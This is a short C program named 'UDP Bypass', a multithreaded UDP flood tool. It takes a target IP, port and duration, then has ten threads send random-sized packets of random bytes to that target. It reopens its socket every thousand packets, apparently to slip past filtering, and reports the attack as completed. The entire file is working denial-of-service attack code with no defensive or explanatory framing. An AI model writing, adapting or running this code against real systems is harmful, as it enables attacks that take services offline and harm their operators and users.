#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>

#define MAX_THREADS 10
#define PACKET_SIZE 1024

void *udp_bypass_flood(void *arg) {
    char **args = (char **)arg;
    char *ip = args[0];
    int port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    int sock;
    struct sockaddr_in server_addr;
    char packet[PACKET_SIZE];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);
    
    srand(time(NULL));
    for(int i = 0; i < PACKET_SIZE; i++) {
        packet[i] = rand() % 256;
    }
    
    time_t start = time(NULL);
    unsigned long packets = 0;
    
    while(time(NULL) - start < duration) {
        int size = 64 + (rand() % (PACKET_SIZE - 64));
        sendto(sock, packet, size, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
        packets++;
        
        if(packets % 1000 == 0) {
            close(sock);
            sock = socket(AF_INET, SOCK_DGRAM, 0);
        }
    }
    
    close(sock);
    printf("[UDPBYPASS] Thread sent %lu packets to %s:%d\n", packets, ip, port);
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("UDP Bypass\n");
        printf("%s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }
    
    pthread_t threads[MAX_THREADS];
    
    for(int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, udp_bypass_flood, argv + 1);
    }
    
    for(int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("[UDPBYPASS] Attack completed\n");
    return 0;
}
